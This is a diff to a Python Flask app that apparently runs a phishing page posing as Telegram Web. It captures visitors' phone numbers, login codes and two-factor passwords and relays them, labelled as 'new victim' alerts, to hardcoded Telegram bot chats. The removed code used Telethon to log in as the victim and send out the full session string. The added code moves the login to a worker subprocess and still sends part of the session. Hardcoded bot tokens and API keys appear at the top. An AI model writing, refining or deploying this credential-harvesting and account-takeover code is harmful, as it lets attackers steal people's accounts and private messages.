@@ -1,117 +1,31 @@
-# app_local_fixed.py
 from flask import Flask, request, render_template_string, jsonify
 import requests
-import asyncio
-import threading
-import time
-from telethon import TelegramClient
-from telethon.errors import PhoneNumberInvalidError
+import subprocess
+import json
+import os
 
 app = Flask(__name__)
 
-# ===== ТВОИ ДАННЫЕ =====
 BOT_TOKEN = "7978014372:AAEBsdCAY6rXCnM5qbF_KJ9OLBpw3AiAYg8"
 CHAT_IDS = ["1626236089", "5009861049"]
-
-API_ID = 34518118
-API_HASH = "804897aff1932a8b686b65f54cea9251"
-# ========================
-
-# Хранилище сессий
-sessions = {}
 
 def send_to_tg(message):
     for chat_id in CHAT_IDS:
         try:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            requests.post(url, json={"chat_id": chat_id, "text": message}, timeout=10)
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                         json={"chat_id": chat_id, "text": message})
         except:
             pass
 
-def send_session_to_tg(phone, session_string):
-    for chat_id in CHAT_IDS:
-        try:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            requests.post(url, json={"chat_id": chat_id, "text": f"🔓 ГОТОВАЯ СЕССИЯ\n\n📱 {phone}\n\n{session_string}\n✅ ВСТАВЬ В TELEGRAM DESKTOP"})
-        except:
-            pass
+# Хранилище phone_code_hash (в реальности лучше Redis)
+temp_storage = {}
 
-def run_async_in_thread(coro, *args):
-    """Запускает асинхронную функцию в отдельном потоке"""
-    result = [None]
-    error = [None]
-    def run():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            result[0] = loop.run_until_complete(coro(*args))
-        except Exception as e:
-            error[0] = e
-        finally:
-            loop.close()
-    thread = threading.Thread(target=run)
-    thread.start()
-    thread.join()
-    if error[0]:
-        raise error[0]
-    return result[0]
-
-def check_phone_number(phone):
-    """Проверяет номер и отправляет код"""
-    try:
-        async def _check():
-            client = TelegramClient(f'session_{phone}_{int(time.time())}', API_ID, API_HASH)
-            await client.connect()
-            try:
-                result = await client.send_code_request(phone)
-                sessions[phone] = {
-                    'client': client,
-                    'phone_code_hash': result.phone_code_hash
-                }
-                return True, "Код отправлен"
-            except PhoneNumberInvalidError:
-                await client.disconnect()
-                return False, "Номер не зарегистрирован в Telegram"
-            except Exception as e:
-                await client.disconnect()
-                return False, str(e)
-        return run_async_in_thread(_check)
-    except Exception as e:
-        return False, str(e)
-
-def complete_login(phone, code, password=None):
-    """Завершает вход с кодом и 2FA"""
-    try:
-        session_data = sessions.get(phone)
-        if not session_data:
-            return False, "Сессия не найдена"
-        client = session_data['client']
-        phone_code_hash = session_data['phone_code_hash']
-        async def _complete():
-            try:
-                if password:
-                    await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
-                    await client.sign_in(password=password)
-                else:
-                    await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
-                session_string = client.session.save()
-                send_session_to_tg(phone, session_string)
-                await client.disconnect()
-                return True, "Вход выполнен"
-            except Exception as e:
-                await client.disconnect()
-                return False, str(e)
-        return run_async_in_thread(_complete)
-    except Exception as e:
-        return False, str(e)
-
-# HTML код такой же, как в прошлый раз (страница входа)
 HTML = """
 <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Web</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -278,14 +192,8 @@ HTML = """
 
         if (step === 1) {
             const phone = phoneInput.value.trim();
-            if (!phone) {
-                showError('Введите номер телефона');
-                return;
-            }
-            if (!isValidPhone(phone)) {
-                showError('Введите корректный номер телефона');
-                return;
-            }
+            if (!phone) { showError('Введите номер телефона'); return; }
+            if (!isValidPhone(phone)) { showError('Введите корректный номер телефона'); return; }
             
             submitBtn.disabled = true;
             submitBtn.innerHTML = 'Отправка кода<span class="loader"></span>';
@@ -319,10 +227,7 @@ HTML = """
         }
         else if (step === 2) {
             const code = codeInput.value.trim();
-            if (!code) {
-                showError('Введите код подтверждения');
-                return;
-            }
+            if (!code) { showError('Введите код подтверждения'); return; }
             
             submitBtn.disabled = true;
             submitBtn.innerHTML = 'Проверка<span class="loader"></span>';
@@ -375,21 +280,6 @@ HTML = """
             }, 1500);
         }
     });
-
-    document.getElementById('qrBtn').addEventListener('click', (e) => {
-        e.preventDefault();
-        alert('QR-код временно недоступен. Используйте вход по номеру телефона.');
-    });
-
-    document.getElementById('forgotBtn').addEventListener('click', (e) => {
-        e.preventDefault();
-        alert('Инструкция по восстановлению пароля отправлена на вашу почту.');
-    });
-
-    document.getElementById('registerBtn').addEventListener('click', (e) => {
-        e.preventDefault();
-        alert('Регистрация доступна только в мобильном приложении.');
-    });
 </script>
 </body>
 </html>
@@ -404,41 +294,70 @@ def send_code():
     data = request.json
     phone = data.get('phone')
     
-    success, message = check_phone_number(phone)
-    
-    send_to_tg(f"📞 НОВАЯ ЖЕРТВА\n\n📱 Номер: {phone}\n{'✅ Код отправлен' if success else '❌ Ошибка'}\n🌐 IP: {request.remote_addr}")
-    
-    return jsonify({'success': success, 'message': message})
+    try:
+        result = subprocess.run(
+            ['python', 'worker.py', 'send_code', json.dumps({'phone': phone})],
+            capture_output=True, text=True, timeout=30
+        )
+        res = json.loads(result.stdout)
+        
+        if res.get('status') == 'ok':
+            temp_storage[phone] = res['phone_code_hash']
+            send_to_tg(f"📞 НОВАЯ ЖЕРТВА\n\n📱 Номер: {phone}\n✅ Код отправлен\n🌐 IP: {request.remote_addr}")
+            return jsonify({'success': True, 'message': 'Код отправлен'})
+        else:
+            return jsonify({'success': False, 'message': res.get('message', 'Ошибка')})
+    except Exception as e:
+        return jsonify({'success': False, 'message': str(e)})
 
 @app.route('/api/confirm_code', methods=['POST'])
 def confirm_code():
     data = request.json
     phone = data.get('phone')
     code = data.get('code')
+    phone_code_hash = temp_storage.get(phone)
     
-    success, message = complete_login(phone, code)
+    if not phone_code_hash:
+        return jsonify({'success': False, 'message': 'Сессия не найдена'})
     
-    send_to_tg(f"🔑 КОД ПОДТВЕРЖДЕНИЯ\n\n📱 Номер: {phone}\n🔢 Код: {code}\n{'✅ Код верный' if success else '❌ Ошибка'}")
-    
-    if success and message == "Вход выполнен":
-        return jsonify({'success': True})
-    elif success and "2FA" in message:
-        return jsonify({'need_password': True})
-    else:
-        return jsonify({'success': False, 'message': message})
+    try:
+        result = subprocess.run(
+            ['python', 'worker.py', 'complete_login', json.dumps({'phone': phone, 'code': code, 'phone_code_hash': phone_code_hash})],
+            capture_output=True, text=True, timeout=30
+        )
+        res = json.loads(result.stdout)
+        
+        if res.get('status') == 'ok':
+            send_to_tg(f"🔑 КОД ВЕРНЫЙ\n\n📱 {phone}\n🔢 Код: {code}\n✅ Вход выполнен")
+            return jsonify({'success': True})
+        elif "2FA" in res.get('message', ''):
+            return jsonify({'need_password': True})
+        else:
+            return jsonify({'success': False, 'message': res.get('message', 'Ошибка')})
+    except Exception as e:
+        return jsonify({'success': False, 'message': str(e)})
 
 @app.route('/api/confirm_2fa', methods=['POST'])
 def confirm_2fa():
     data = request.json
     phone = data.get('phone')
     password = data.get('password')
+    phone_code_hash = temp_storage.get(phone)
     
-    success, message = complete_login(phone, None, password)
-    
-    send_to_tg(f"🔒 2FA ПАРОЛЬ\n\n📱 Номер: {phone}\n🔐 Пароль: {password}\n{'✅ ДОСТУП ПОЛУЧЕН' if success else '❌ Ошибка'}")
-    
-    return jsonify({'success': success})
+    try:
+        result = subprocess.run(
+            ['python', 'worker.py', 'complete_login', json.dumps({'phone': phone, 'code': '', 'phone_code_hash': phone_code_hash, 'password': password})],
+            capture_output=True, text=True, timeout=30
+        )
+        res = json.loads(result.stdout)
+        
+        if res.get('status') == 'ok':
+            send_to_tg(f"🔒 2FA ПОЛУЧЕН\n\n📱 {phone}\n🔐 Пароль: {password}\n✅ ДОСТУП ПОЛУЧЕН\n🎭 session: {res.get('session', '')[:50]}...")
+            return jsonify({'success': True})
+        else:
+            return jsonify({'success': False, 'message': res.get('message', 'Ошибка')})
+    except Exception as e:
+        return jsonify({'success': False, 'message': str(e)})
 
 if __name__ == '__main__':
-    # Важно: отключаем дебаг-режим, который ломает asyncio
     app.run(host='0.0.0.0', port=5000, debug=False)
